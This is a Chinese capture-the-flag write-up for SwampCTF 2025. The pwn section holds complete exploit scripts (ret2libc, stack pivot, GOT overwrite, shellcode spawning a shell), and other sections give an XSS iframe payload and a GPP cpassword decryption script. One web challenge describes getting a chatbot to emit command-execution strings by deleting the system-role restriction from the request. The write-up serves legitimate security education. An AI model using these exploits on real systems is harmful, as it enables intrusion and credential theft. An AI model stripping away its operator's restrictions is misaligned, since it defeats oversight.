# swampctf2025 WP-先知社区

> **来源**: https://xz.aliyun.com/news/17602  
> **文章ID**: 17602

---

## web

## web1 Serialies

/api/person

![屏幕截图 2025-03-29 121103.png](images/20250403113840-227f9261-103d-1.png)![屏幕截图 2025-03-29 121137.png](images/20250403113841-22fd32bf-103d-1.png)

## web2 Hidden Message-Board

​

```
import logo from './logo.svg';
 import './App.css';
 import React, { useState } from "react";
 import {returnRandomResponses, getFlag } from "./Messages.tsx";
 
 function App() {  
   const defaultValue = "";
   const [currentMessage, setMessageBoxValue] = React.useState(defaultValue);
   const [flagGoesHere, setFlagValue] = useState("");
   const divRef = React.useRef(null);
 
   const [lotteryNumber, setLotteryNumber] = useState(5);
   const [totalNumbers, setTotalNumber] = useState(100);
 
   var printFlagSetup = document.getElementById("flagstuff");
 
   console.log("Flag Will Be Checked")
 
   function addNewMessages(event){
     event.preventDefault()
 
     if(currentMessage != ""){
       if(printFlagSetup != undefined){
         printFlagSetup.setAttribute("code", "")
       }
 
       addNewMessageChance()
       divRef.current.innerHTML = "<b>[swampctfcontestant]: </b>" + currentMessage + "<br>" + divRef.current.innerHTML;
       addNewMessageChance()
 
       setMessageBoxValue(defaultValue)
     }
   }
 
   function addNewMessageChance(){
     var willTypeMessage = Math.floor(Math.random() * totalNumbers);
 
     if(willTypeMessage <= lotteryNumber){
       divRef.current.innerHTML = returnRandomResponses() + divRef.current.innerHTML;
       willTypeMessage = Math.floor(Math.random() * 100);
     }
   }
 
   function updateMessageBox(newTextBoxValue){
     setMessageBoxValue(newTextBoxValue)
     addNewMessageChance()
   }
 
   async function checkCode(){
     if(printFlagSetup != undefined){
       console.log(printFlagSetup.getAttribute("code"))
 
       if(printFlagSetup.getAttribute("code") === "G1v3M3Th3Fl@g!!!!"){
         const flag = await getFlag();
         setFlagValue("[flag]: " + flag);
       }
     }
   }
 
   checkCode()
 
   return (
     <div>
       <header className="App-header">
         <h1 className="App-header-text">
           HackerChat
         </h1>
       </header>
 
       <header className="App-content" >
       
       <h1><u>Text Formatting</u></h1>
       <p>
         Use &lt;b&gt;text&lt;/b&gt; for <b>bold</b> <br></br>
         Use &lt;i&gt;text&lt;/i&gt; for <i>italics</i> <br></br>
         Use &lt;u&gt;text&lt;/u&gt; for <u>underline</u> <br></br>
         Use &lt;br&gt;&lt;/br&gt; for new line <br></br>
         Use &lt;del&gt;&lt;/del&gt; for <del>strikethrough</del> <br></br>
         Use &lt;img src = "url"&gt;&lt;/img&gt; for images: <img src = "https://brandcenter.ufl.edu/wp-content/uploads/2021/10/1280px-University_of_Florida_logo.svg-1-300x57.png" width={250} height={50}></img> <br></br>
         Use &lt;a href = "url"&gt;&lt;a&gt; for <a href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ">links</a> <br></br>
       </p>
     
       <h1><u>New Message</u></h1>
       <textarea className = "App-textbox" placeholder = "Enter New Message..." value={currentMessage} /*onClick={addNewMessageChance}*/ onChange={(e) => updateMessageBox(e.target.value)}> </textarea>
 
       <div id = "flagstuff" code = ""></div>
 
       <div style={{display:'none'}}>
       Need to remove flagstuff. code: G1v3M3Th3Fl@g!!!!
       </div>
 
       <div>
         <form onSubmit={addNewMessages}>
           <button className='App-button' type="submit">
             Post
           </button>
         </form>
       </div>
 
       <h1><u>All User Messages</u></h1>
       {flagGoesHere}
       <div ref={divRef}></div>
 
       </header>
 
       <footer className="App-footer">
       <input type="number" value={lotteryNumber} onChange={(e) => setLotteryNumber(e.target.value)}></input>
       <input type="number" value={totalNumbers} onChange={(e) => setTotalNumber(e.target.value)}></input>
       </footer>
     </div>
   );
 }
 
 export default App;
```

![](images/20250403113842-235d7219-103d-1.png)

## web3 Beginner Web

F12拿到flag1,审计js发现flag2和flag3加密逻辑

```
var gs = class e {
  constructor(t) {
    this.cookieService = t;
    let n = 'flagPart2_3',
      r = 'U2FsdGVkX1/oCOrv2BF34XQbx7f34cYJ8aA71tr8cl8=',
      o = 'U2FsdGVkX197aFEtB5VUIBcswkWs4GiFPal6425rsTU=';
    this.cookieService.set(
      'flagPart2',
      $n.AES.decrypt(r, n).toString($n.enc.Utf8),
      { expires: 7, path: '/', secure: !0, sameSite: 'Strict' },
    );
    let i = new Headers();
    i.set('flagPart3', $n.AES.decrypt(o, n).toString($n.enc.Utf8)),
      fetch('/favicon.ico', { headers: i });
```

利用cryptojs解密，在浏览器控制台输入

```
// 加载 CryptoJS 库（如果网页本身未加载）
const script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';
document.head.appendChild(script);

// 解密代码（等待 CryptoJS 加载完成后执行）
setTimeout(() => {
  const key = "flagPart2_3";
  const flagPart2_enc = "U2FsdGVkX1/oCOrv2BF34XQbx7f34cYJ8aA71tr8cl8=";
  const flagPart3_enc = "U2FsdGVkX197aFEtB5VUIBcswkWs4GiFPal6425rsTU=";

  const decrypt = (encrypted) => {
    const bytes = CryptoJS.AES.decrypt(encrypted, key);
    return bytes.toString(CryptoJS.enc.Utf8);
  };

  console.log("flagPart2:", decrypt(flagPart2_enc));
  console.log("flagPart3:", decrypt(flagPart3_enc));
}, 1000);

```

## web4 SlowAPI

<https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware>

![](images/20250403113842-23e56e5b-103d-1.png)

![](images/20250403113843-246a1051-103d-1.png)

## web5 Sunset Boulevard

​

admin路由有登录功能点 没啥用

题目提示fan latters有用

xss打cookie尝试

![](images/20250403113844-24d9574a-103d-1.png)

## web6 Contamination (todo)

![](images/20250403113846-25edfbac-103d-1.png)

该路由及参数才会被转发到后端的`/api`路由

应该要打请求走私

![image.png](images/20250403113849-278a06c1-103d-1.png)

构造一个 JSON 字符串，{"a": "é"}，e9h，在 ISO‑8859‑1 下是合法的，但如果直接当作 UTF‑8 来解析，就会失败。

​

## web7 Editor

app.component.ts

![屏幕截图 2025-03-30 111443.png](images/20250403113849-2802858c-103d-1.png)

* `<script>` **标签**：直接被移除，无法执行 JavaScript。
* `on*` **事件处理器**（如 `onclick`、`onload`）：被正则表达式移除。
* **CSS 注入**：仅允许替换 `<style class="custom-user-css">` 的内容，无法直接执行 JS。

inframe标签直接加载flag.txt

```
<iframe src="/flag.txt" onload="alert(this.contentDocument.body.innerText)"></iframe>
```

![屏幕截图 2025-03-30 111717.png](images/20250403113850-2858b8fe-103d-1.png)

## web8 SwampTech Solutions

guest身份登录进去

![image.png](images/20250403113850-28a4d6e3-103d-1.png)

注意到cookie是guest的md5

伪造admin进adminpage.php

发现隐藏的接口

![image.png](images/20250403113852-295b84e6-103d-1.png)

打xxe

![image.png](images/20250403113853-2a385cdf-103d-1.png)

## web9 MaybeHappyEndingGPT

想办法让ai返回的数据构成成rce的字符串

![](images/20250403113855-2b626e2b-103d-1.png)

![](images/20250403113857-2c84c0bd-103d-1.png)

尝试后发现有限制 要绕 请求包中可以看见system身份发的限制 直接删了就行

![](images/20250403113858-2d1e3b8e-103d-1.png)

![](images/20250403113859-2df32b70-103d-1.png)

![](images/20250403113901-2ee66c96-103d-1.png)

# Misc

## 0x01-Join our Discord!

![image.png](images/20250403113902-2f9d6c41-103d-1.png)

swampCTF{w3lc0m3\_t0\_th3\_swamp}

​

## 0x02- Pretty Picture: Double Exposure

图套图

<https://samdeleon.github.io/UnhidingImages.html>

![image.png](images/20250403113903-3056fd34-103d-1.png)

swampCTF{m3ss4g3s\_0r\_c0de\_c4n\_b3\_h1dd3n\_1n\_1m4g3s}

## 0x06 Blue

goblob 枚举blob

![](images/20260326181920-41047352-28fd-1.png)

允许匿名访问 连上去直接读flag

![](images/20260326181921-4155971b-28fd-1.png)

# OSInt

## 0x01- Party Time!

<https://www.strerr.com/cn/exif.html>

查exif信息

![image.png](images/20250403113904-30d1d243-103d-1.png)

swampCTF{29.65,82.33}

## 0x03- Party Time! Level 2

![image.png](images/20250403113906-31b0fbe3-103d-1.png)

![image.png](images/20250403113908-332d4dc6-103d-1.png)

评论里面

swampCTF{Checkers\_Yum}

# Forensics

## 0x01-Homework Help

![图片.png](images/20250403113911-34bea303-103d-1.png)扫描磁盘后恢复已删除文件

![图片.png](images/20250403113912-355ce0a5-103d-1.png)

swampCTF{n0thing\_i5\_3v3r\_d3l3t3d}

## 0x02-Planetary Storage

![图片.png](images/20250403113913-35d7d757-103d-1.png)

提取payload部分解两次base

![图片.png](images/20250403113914-36645d85-103d-1.png)

swampCTF{1pf5-b453d-d474b453}

## 0x03-Preferential Treatment

> We have an old Windows Server 2008 instance that we lost the password for. Can you see if you can find one in this packet capture?

SMB导出配置文件`Groups.xml`

![图片.png](images/20250403113915-370caa42-103d-1.png)

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EC16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-52E5-4d24-8B1A-D9BDE98BA1D1}" name="swampctf.com\Administrator" image="2"
    changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description=""
      cpassword="dAw7VQvfj9rs53A8t4PudTVf85Ca5cmC1Xjx6TpI/cS8WD4D8DXbKiWIZslihdJw3Rf+ijboX7FgLW7pF0K6x7dfhQ8gxLq34ENGjN8eTOI="
      changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="swampctf.com\Administrator"/>
  </User>
</Groups>

```

cpassword是密文

加密方式为`AES 256`，虽然目前`AES 256`很难被攻破，但是微软选择公开了该`AES 256`加密的私钥

![](images/20250403113915-379220fb-103d-1.png)

```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```

借助该私钥，我们就能还原出明文。

```
#!/usr/bin/python2
import sys
from Crypto.Cipher import AES
from base64 import b64decode

if(len(sys.argv) != 2):
    print "decrypt.py <cpassword>"
    sys.exit(0)

key = """4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b""".decode('hex')
cpassword = sys.argv[1]
cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
password = b64decode(cpassword)
out = AES.new(key, AES.MODE_CBC, "\x00" * 16)
out = out.decrypt(password)
print out[:-ord(out[-1])].decode('utf16')
```

![图片.png](images/20250403113916-3823f9c3-103d-1.png)swampCTF{4v3r463\_w1nd0w5\_53cur17y}

​

也可以kali自带工具一把梭

gpp-decrypt "dAw7VQvfj9rs53A8t4PudTVf85Ca5cmC1Xjx6TpI/cS8WD4D8DXbKiWIZslihdJw3Rf+ijboX7FgLW7pF0K6x7dfhQ8gxLq34ENGjN8eTOI="

## 0x04-MuddyWater

> We caught a threat actor, called MuddyWater, bruteforcing a login for our Domain Controller. We have a packet capture of the intrustion. Can you figure out which account they logged in to and what the password is?
>
> Flag format is `swampCTF{<username>:<password>}`

​

​

NTLMv2哈希破解，首先搜索关键字找登录成功的搜STATUS\_SUCCESS

追踪流后提取对应信息hashcat跑一遍hackbackzip:pikeplace

从流量中提取NTLMv2哈希并破解步骤参照

<https://zhuanlan.zhihu.com/p/52882041>

# Crypto

## crypto1 Rock my Password

​

```
import hashlib
import tqdm 

todo = []
resHash = "f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc"

def genHash(inData):


    for i in range(100):
        inData = hashlib.md5(inData).digest()
    for i in range(100):
        inData = hashlib.sha256(inData).digest()
    for i in range(100):
        inData = hashlib.sha512(inData).digest()

    res = inData.hex()
    return res


with open("rockyou.txt","rb")as f:
    lines = f.readlines()
    for line in lines:
        if(len(line) == 11):
            todo.append(line.strip())

print(len(todo))


for i in tqdm.tqdm(todo):

    tem = b"swampCTF{" + i + b"}"
    if genHash(tem) == resHash:
        print(tem)
        break
```

![](images/20260326181921-419be5bc-28fd-1.png)

## Intercepted communications:

题目描述说，可能密钥重复使用 那？

截获的密文 1184个字符

只有m4也是 1184个字符，用m4 的明文和密文，异或出密钥，拿密钥再去异或题目的密文得到flag

```
from Crypto.Util.number import *
dec = 0b01000001011100100110010100100000011110010110111101110101001000000111001101110101011100100110010100100000011101000110100001101001011100110010000001101001011100110010000001110010011001010110000101101100011011000111100100100000011100110110010101100011011101010111001001100101001111110010000001001001001000000110001101100001011011100010011101110100001000000111001101101000011000010110101101100101001000000111010001101000011001010010000001100110011001010110010101101100011010010110111001100111001000000111010001101000011000010111010000100000010010010010011101101101001000000110001001100101011010010110111001100111001000000111011101100001011101000110001101101000011001010110010000100000011100110110111101101101011001010110100001101111011101110010111000100000010101110110010101101001011100100110010000100000010010010010000001101011011011100110111101110111001011000010000001100010011101010111010000100000010010010010000001110011011101110110010101100001011100100010000001110100011010000110010101110010011001010010011101110011001000000111001101101111011011010110010101101111011011100110010100100000011011000110100101110011011101000110010101101110011010010110111001100111001011100010111000101110
enc = 0b00100001111101110011100101100111111000110100001001111111000110000011011100100101001101000001010011010001010000110110011100100010000111101001100111010110011010111000010001100100010011001000000001000100010101111000110000101000000100011111101010011111111111111011111001011111010100100000011010000011101000000010000100101011001101011011111000111001110010110011110001011111010101111111100010001110010111101010101100011011111111011100011101101101100101001111100110111010111110000001001001101000001001100001111010110100000001101010100100110000001010011001101110011000110100011100110111010000001110001001000110101001111101111111100100100010111001100110100000000111011001110011001101110010010110100001001111010000101100001000000011000111001011101000011010000001111111011111110001100000001111101111100110101101100111001001000101111100111001101101011111011111101110100101100110111011011000110110100000000011011111011001111110111010010010011111010101110100010100011100011000100100010011100101110010111101111100011110101101101000110010110111011100010111001000101111000110111111010111010010000100111101101011010110101111100101011000110010000111010011011011111100111000101101110001010111010100001110
key = dec ^ enc
messge = 0b00110100111101110011110100101001111010010100101101101111010010100011011000111001001010000001011011010001010101000111110100101110000010011101110011010001011011001100110101110111010001011001001000001000010101011001101001111111010011001011111110111110111011111110110001001001000110000101010010101111101000000011011000100101011110111111001000101000100011100011111100010111010000101111101110001110000100111111111100000000111111011000010001111001100101001110100011111010101100010000101101101010001001100000111010110011000010011111101001100100010000001100101110010100100111111101101110010101001001011001011110101011101001001110101101100011111101010110111000011011011101100011111000111100010011100101110011010010101000001001110010000110011110011111001111110100110110011111110001111011001000101111110011100000101100001000101100110111110010011101110011000101111111110001011111110101001101100100110001000010010001111100110010111110010100011110001001110001000110011100011000100011010100010101100010100010111001001000111101001111101011010111111100110110001010101110001011100011010000010001101101101111111100100101011111100101011100100001101111011100010110011001000000011110101110110010011001111101
m = key ^ messge
print(long_to_bytes(m))
```

# PWN

## Oh my buffer

login函数存在栈任意大小泄露

```
void __cdecl login()
{
  int len; // [rsp+Ch] [rbp-24h] BYREF
  char buffer[16]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  write(1, "How long is your username: ", 0x1BuLL);
  __isoc99_fscanf(stdin, "%d", &len);
  write(1, "Username: ", 0xAuLL);
  read(0, buffer, 0x10uLL);
  write(1, "Sorry, we couldn't find the user: ", 0x22uLL);
  write(1, buffer, len);
}
```

reg函数存在有0x12字节的溢出

​

思路：

通过login 函数泄露出stack ，canary，libcbase

通过reg函数，写rop，覆盖返回地址末位2字节为leave\_ret地址，进行栈迁移

ps:思路应该是没问题，问题是远程libc没给，我就直接跑了一下，直接把flag搞出来了？？

```
from pwn import *
# from LibcSearcher import *
# from ctypes import *

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def re():
    p.recvline()
def pr(c):
    print(c)
def rl(a):
    p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def ga():
    rl(b'0x')
    return int(p.recvuntil(b'
')[:-1], 16)

def ret2libc(libcbase):
    system = libcbase + libc.sym['system']
    sh = libcbase + next(libc.search(b"/bin/sh"))
    return system,sh

def menu(choice):
    sla(b'>',str(choice))

def reg(Username,Password):
    menu(1)
    sla(b'Username:',Username)
    sa(b'Password:',Password)
    
def Login(size,Username):
    menu(2)
    sla(b'How long is your username:',str(size))
    sla(b'Username:',Username)

p = remote('chals.swampctf.com',40005)
# p = process('./binary') #
libc = ELF('/home/lxxx/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
context(os = 'linux',arch='amd64' ,log_level='debug')

menu(2)
sla(b'How long is your username:',str(0x28))
sla(b'Username:',b'a'*15)
p.recvuntil(b"the user:")
p.recv(0x19)
canry = u64(p.recv(8))
print("canry==>"+hex(canry))
stack = get_addr()
print("stack==>"+hex(stack))

menu(2)
sla(b'How long is your username:',str(0x20+0x90))
sla(b'Username:',b'a'*15)
p.recvuntil(b"the user:")
p.recv(0xa8)
libcbase = get_addr() - (0x7f8377f6fd90-0x7f8377f46000)
print("libcbase==>"+hex(libcbase))
# )

menu(1)
sla(b'Username:',b'a')

# -(0x150-0xb0)+8
leave_ret = 0x4012f9
rdi = libcbase + 0x2a3e5
system,sh=ret2libc(libcbase)
payload = p64(rdi) + p64(sh) + p64(system) + p64(canry)+ p64(stack) + b'\xf9\x12'
# debug()
sa(b'Password:',payload)

inter()
```

## coredump\_GAAS

```
from pwn import *
 from pwncli import *
 def s(a):
     p.send(a)
 def sa(a, b):
     p.sendafter(a, b)
 def sl(a):
     p.sendline(a)
 def sla(a, b):
     p.sendlineafter(a, b)
 def li(a):
     print(hex(a))
 def r():
     p.recv()
 def pr():
     print(p.recv())
 def rl(a):
     return p.recvuntil(a)
 def inter():
     p.interactive()
 def get_32():
     return u32(p.recvuntil(b'\xf7')[-4:])
 def get_addr():
     return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
 def get_sb():
     return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
 def debug():
     gdb.attach(p)
 
 context(os='linux',arch='amd64',log_level='debug')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 elf=ELF('./pwn')
 # p = process('./pwn')
 p = remote('chals.swampctf.com', 40003)
 
 pop_r15 = 0x4012A2
 pop_rsi_r15 = 0x4012A2-1
 pop_rdi = 0x4012A2+1
 gets = 0x401040
 printf = 0x401030
 main = 0x4011A3
 bss = 0x404000 + 0x300
 payload = b"a" * (0xa+8) + p64(pop_rdi) + p64(bss) + p64(gets) + p64(main)
 sl(payload)
 payload = b"%p"
 sl(payload)
 payload = b"a" * (0xa+8) + p64(pop_rdi) + p64(0x404020)+ p64(printf) + p64(main)
 sl(payload)
 libc_base = get_addr()- 0x087070
 bin_sh = libc_base + 0x1cb42f
 system = libc_base + 0x058740
 li(libc_base)
 payload = b"a" * (0xa+8) + p64(0x401239) + p64(pop_rdi) + p64(bin_sh)+ p64(system)
 sl(payload)
 inter()
```

![image.png](images/20250403113917-388adb50-103d-1.png)

给了个core\_dump文件，不会直接提取出来可执行文件，静态分析一波，发现就是gets，然后printf，没有canary和PIE，那就直接利用printf泄露libc，之后再接着打ret2libc就行了

## notecard

查看程序保护

```
Arch:       amd64-64-little
     RELRO:      Partial RELRO
     Stack:      Canary found
     NX:         NX enabled
     PIE:        PIE enabled
```

刚开始初始化了一个结构体，然后给了让输入用户名，之后就是三个功能的菜单：修改，打印还有退出

用户名这里可以泄露code\_base

![image.png](images/20250403113918-38dbfa61-103d-1.png)

```
name(b"a"*0x30,b"n")
 rl(b"Hello aaaaaaaaaaaaaaaaaaaaaaaa")
 code_base = u64(p.recv(6).ljust(8, b'\x00')) - 4720
 li(code_base)
```

漏洞点出在了对于idx没有检查负数，导致可以越界修改指针，造成任意位置读写

![image.png](images/20250403113918-3939b508-103d-1.png)

![image.png](images/20250403113919-3997a786-103d-1.png)

然后我们通过读got表拿到libc地址，因为got表可写，将puts改成system，再提前布置一下bin\_sh，最后即可成功getshell，本题未给libc，因此泄露出地址 需要自己去查，本题远程是libc2.39

```
read_to(b"4",p64(code_base+16408)*5)
 write_to(b"-2")
 libc_base = get_addr() - 0x087bd0
 system = libc_base + 0x058740
 bin_sh = libc_base + 0x1cb42f
 li(libc_base)
 read_to(b"-2",p64(system))
 read_to(b"4",p64(bin_sh)*5)
 write_to(b"-2")
```

完整exp

```
from pwn import *
 from pwncli import *
 def s(a):
     p.send(a)
 def sa(a, b):
     p.sendafter(a, b)
 def sl(a):
     p.sendline(a)
 def sla(a, b):
     p.sendlineafter(a, b)
 def li(a):
     print(hex(a))
 def r():
     p.recv()
 def pr():
     print(p.recv())
 def rl(a):
     return p.recvuntil(a)
 def inter():
     p.interactive()
 def get_32():
     return u32(p.recvuntil(b'\xf7')[-4:])
 def get_addr():
     return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
 def get_sb():
     return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
 def debug():
     gdb.attach(p)
 
 context(os='linux',arch='amd64',log_level='debug')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 elf=ELF('./pwn')
 p = process('./pwn')
 # p = remote('chals.swampctf.com', 40002)
 def name(name,choice):
     sla(b"Please enter your name:",name)
     sl(choice)
 def read_to(num,content):
     sla(b">",b"2")
     sla(b"(0 - 4):",num)
     s(content)
 def write_to(num):
     sla(b">",b"1")
     sla(b"(0 - 4):",num)
 
 # gdb.attach(p,'b *$rebase(0x13B1)') #read
 # gdb.attach(p,'b *$rebase(0x1310)') #write
 name(b"a"*0x30,b"n")
 rl(b"Hello aaaaaaaaaaaaaaaaaaaaaaaa")
 code_base = u64(p.recv(6).ljust(8, b'\x00')) - 4720
 li(code_base)
 
 read_to(b"4",p64(code_base+16408)*5)
 write_to(b"-2")
 libc_base = get_addr() - 0x087bd0
 system = libc_base + 0x058740
 bin_sh = libc_base + 0x1cb42f
 li(libc_base)
 read_to(b"-2",p64(system))
 read_to(b"4",p64(bin_sh)*5)
 write_to(b"-2")
 
 inter()
```

## Tinybrain

一个brianfuck语言的解释器

![121d24adcbbb093dfa97d0737614964.png](images/20250403113920-3a05976f-103d-1.png)

只有8个指令

​

> 在汇编语言中，使用数据段（`.data` 段）实现 `switch-case` 的跳转表（Jump Table）是一种优化手段，适用于 **连续且密集的** `case` **值**。

程序有256\*2个跳转表，没对指针做越界判断，可以改跳转表，且程序存在rwx段

所以思路如下：

写入shellcode，移动ptr到跳转表 ，修改 \xff 的跳转表为 shellcode 地址

输入/xff ，执行shellcode getshell

```
from pwn import *
p = remote('chals.swampctf.com',41414)
context(os = 'linux',arch='amd64' ,log_level='debug')

payload =  b'+'*0x2f    		#/
payload += b'>' + b'+'*0x62     #b
payload += b'>' + b'+'*0x69     #i 
payload += b'>' + b'+'*0x6e     #n
payload += b'>' + b'+'*0x2f     #/
payload += b'>' + b'+'*0x73     #s
payload += b'>' + b'+'*0x68     #h
payload += b'>' 				#\x00


shellcode = b"\x48\x31\xF6\x31\xD2\x48\xC7\xC7\x00\x38\x40\x00\xB0\x3B\x0F\x05"
bf_code = ""
for byte in shellcode:
    bf_code += f">{'+' * byte}"

payload2 = b'<'*0x818 + b'<'*0x7fc  + b'<'*0x8
payload2 += b'<.' 


payload2 += b'<' + b'+'*0x28  + b'.' 
payload2 += b'<' + b'-'*0x16  + b'.' + b'\xff'
p.sendlineafter(b'instructions (q to finish):',payload+bf_code.encode()+payload2+b'q')


p.interactive()
```

# 赛后补充

```
Forensics
Proto Proto 2

Crypto
SongCipher

re
You Shall Not Passss
Midi Melody
Wamp Audio
```

## Misc

### 0x03-Read Between .tga Lines

算是比较新型的题目

tips： 两张图片横截混淆

![image.png](images/20250403113921-3aa346fa-103d-1.png)

```
def split_tga(input_file, output_file1, output_file2):
    with open(input_file, 'rb') as file:
        data = bytearray(file.read())

    header_size = 18

    width = int.from_bytes(data[12:14], byteorder='little')
    height = int.from_bytes(data[14:16], byteorder='little')

    image_data = data[header_size:]

    bytes_per_pixel = 3

    image_data_odd = bytearray()
    image_data_even = bytearray()

    for y in range(height):
        pixel_index_start = y * width * bytes_per_pixel
        pixel_index_end = pixel_index_start + width * bytes_per_pixel

        if y % 2 == 0:
            image_data_odd.extend(image_data[pixel_index_start:pixel_index_end])

        else:
            image_data_even.extend(image_data[pixel_index_start:pixel_index_end])

    with open(output_file1, 'wb') as file1:
        file1.write(data[:header_size])
        file1.write(image_data_odd)

    with open(output_file2, 'wb') as file2:
        file2.write(data[:header_size])
        file2.write(image_data_even)

    print(f"Fichiers TGA séparés sauvegardés sous : {output_file1} et {output_file2}")


input_file = 'chal.tga'
output_file1 = 'cal_odd.tga'
output_file2 = 'chal_even.tga'

split_tga(input_file, output_file1, output_file2)
```

### 0x04-Lost In Translation

题目描述：

We found this program which we know has a flag somewhere, but nothing we've tried has been able to extract it. Can you figure it out?

To run the program, you can use NodeJS (recommended version 18.17.1 or higher).

![image.png](images/20250403113922-3b519fbc-103d-1.png)

<https://naokikp.github.io/wsi/whitespace.html>

![image.png](images/20250403113923-3bc91b37-103d-1.png)

### 0x05-Messages From The Stars

![image.png](images/20250403113923-3c30e45e-103d-1.png)

音频左右通道不一样

提取数据

```
import numpy as np
from scipy.io import wavfile
from scipy.signal import stft
import matplotlib.pyplot as plt

def extract_binary_from_audio(audio_path, output_txt_path, plot_image=False):
    # 读取音频文件
    Fs, message = wavfile.read(audio_path)
    
    # 参数设置
    segment_size = 410  # 每个音调的采样点数
    num_segments = len(message) // segment_size
    
    binary_output = []  # 存储二进制数据
    
    # 初始化段索引
    section_start = 0
    section_end = segment_size
    
    # 处理每一段音频
    for i in range(num_segments // 2):
        f, t, Zxx = stft(
            message[section_start:section_end],
            fs=Fs,
            nperseg=segment_size,
            boundary=None
        )
        
        # 找到目标频率的索引
        idx_896 = np.argmin(np.abs(f - 896))
        idx_1088 = np.argmin(np.abs(f - 1088))
        
        # 检测幅度
        mag_896 = np.max(np.abs(Zxx[idx_896]))
        mag_1088 = np.max(np.abs(Zxx[idx_1088]))
        
        # 解码
        if mag_1088 > 30:
            binary_output.append('0')
        elif mag_896 > 30:
            binary_output.append('1')
        else:
            print(f"Warning: Segment {i} failed (896Hz={mag_896:.1f}, 1088Hz={mag_1088:.1f})")
        
        # 移动到下一段
        section_start += segment_size * 2
        section_end += segment_size * 2
    
    # 保存为文本文件
    with open(output_txt_path, 'w') as f:
        line_width = int(np.sqrt(len(binary_output)))
        for i in range(0, len(binary_output), line_width):
            line = ''.join(binary_output[i:i+line_width])
            f.write(line + '
')
    
    print(f"Binary data saved to: {output_txt_path}")
    print(f"Total bits: {len(binary_output)} (shape: {line_width}x{line_width})")

    # 可选：绘制图像
    if plot_image:
        binary_matrix = np.array([int(bit) for bit in binary_output])
        size = int(np.sqrt(len(binary_matrix)))
        plt.imshow(binary_matrix.reshape(size, size), cmap='binary')
        plt.savefig('output.png')
        plt.close()

# 使用示例
extract_binary_from_audio(
    audio_path="message_from_space.wav",
    output_txt_path="binary_output.txt",
    plot_image=True  # 设为True会生成图像
)
```

![output.png](images/20250403113924-3c8d0fe1-103d-1.png)

​

## OSint

### 0x02- On Thin ICE

```
D3 A6 D0 BA D0 BC D1 8B D1 81 D3 A7 D0 B4 20 D0 B2 D0 BE D1 81 D1 8C D0 BA D0 BE D0 B2 2E 20 D0 9C D0 B5 D0 B7 D0 B4 D0 BB D1 83 D0 BD 2E
```

转换得到hex

> Ӧкмысӧд воськов. Мездлун.

拆分翻译得到 第八步 自由

根据google得到这是使命召唤七里面的台词

再第二关前苏联监狱

具体地点在沃尔库塔 ，得到地点我们就去googlemap查找这个地方的溜冰场

![image.png](images/20250403113925-3d5e2f20-103d-1.png)

![image.png](images/20250403113927-3e7aa88a-103d-1.png)

## Forensics

### 0x05- proto proto

tips ： 题目要求分析数据包中的协议对服务器地址进行交互

![image.png](images/20250403113929-3f5947e5-103d-1.png)

payload

```
flag.txt  
```

```
import socket
# - b"\x02" is the command code (possibly indicating a file request)
server = 'chals.swampctf.com'
port = 44254
# - b"\x08" is the length of the filename 8 bytes for "flag.txt")
payload = b"\x02\x08\x66\x6c\x61\x67\x2e\x74\x78\x74"
# 创建UDP套接字
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (server, port))
# 指定目标地址和端口

response, addr = sock.recvfrom(4096)
# 发送数据
print("Decoded response:", response.decode(errors='ignore'))

# 关闭套接字
sock.close()
```

![image.png](images/20250403113930-403e3049-103d-1.png)
